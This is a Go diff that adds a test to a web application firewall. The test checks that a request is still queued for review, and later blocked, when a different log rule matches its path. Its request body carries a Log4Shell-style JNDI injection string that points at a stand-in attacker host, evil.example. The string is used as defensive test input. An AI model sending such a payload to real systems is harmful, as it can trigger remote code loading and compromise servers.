@@ -4,6 +4,7 @@ import (
 	"bytes"
 	"compress/gzip"
 	"context"
+	"fmt"
 	"io"
 	"net/http"
 	"net/http/httptest"
@@ -319,6 +320,54 @@ func TestRewriteWAFKeepsReviewCandidateAndItsInspectionURI(t *testing.T) {
 				t.Fatal("selected review identity changed transport or public/upstream audit fields")
 			}
 		})
+	}
+}
+
+func TestRewriteWAFKeepsReviewCandidateBehindOtherIdentityLog(t *testing.T) {
+	for _, level := range []int{3, 4} {
+		for _, tc := range []struct{ name, logPath, candidateURI string }{
+			{"target candidate", "/original", "/target?origin=1"},
+			{"public candidate", "/target", "/original?public=1"},
+		} {
+			t.Run(fmt.Sprintf("level%d/%s", level, tc.name), func(t *testing.T) {
+				analyzer := semantic.NewAnalyzer("block", level)
+				analyzer.SetAllowlists([]string{tc.logPath}, nil)
+				logger := rules.New([]rules.Rule{{ID: "path-log", Name: "path log", Enabled: true, Location: "uri", Pattern: regexp.MustCompile("^" + tc.logPath + "$"), Action: engine.ActionLog, Severity: engine.SeverityLow}})
+				server, sink := newRewriteWAFServer(t, "/target?origin=1", engine.NewPipeline(logger, analyzer), func(cfg *config.Config) {
+					cfg.Sites[0].WAF.ParanoiaLevel = level
+					cfg.Sites[0].WAF.SemanticPolicy.PromoteSeconds = 30
+				})
+				queue := &memoryReviewQueue{}
+				server.SetReviewQueue(queue)
+				request := func() *httptest.ResponseRecorder {
+					req := httptest.NewRequest(http.MethodPost, "http://localhost/original?public=1", strings.NewReader("note ${jndi:ldap://evil.example/a} in logs"))
+					req.Header.Set("Content-Type", "text/plain")
+					rec := httptest.NewRecorder()
+					server.Handler().ServeHTTP(rec, req)
+					return rec
+				}
+				first := request()
+				items := queue.snapshot()
+				if first.Code != http.StatusOK || len(items) != 1 {
+					t.Fatalf("other identity's log hid review candidate: status=%d items=%+v", first.Code, items)
+				}
+				if items[0].URI != tc.candidateURI || items[0].Shape != "embedded" || items[0].ProtectionLevel != level {
+					t.Fatalf("review identity or candidate changed: %+v", items[0])
+				}
+				inspectionURI, _ := sink.entries[0].Metadata[selectedInspectionURIKey].(string)
+				if !strings.HasPrefix(inspectionURI, tc.logPath+"?") || first.Header().Get("X-Upstream-URI") != "/target?origin=1" {
+					t.Fatalf("candidate changed enforcement identity or transport: inspection=%q upstream=%q", inspectionURI, first.Header().Get("X-Upstream-URI"))
+				}
+				if level == 4 {
+					if !server.promotes.Active(items[0].SiteID, server.wallNow()) {
+						t.Fatal("retained embedded candidate did not arm promotion")
+					}
+					if second := request(); second.Code != http.StatusForbidden || len(queue.snapshot()) != 1 {
+						t.Fatalf("promotion did not block the next candidate: status=%d items=%+v", second.Code, queue.snapshot())
+					}
+				}
+			})
+		}
 	}
 }
 
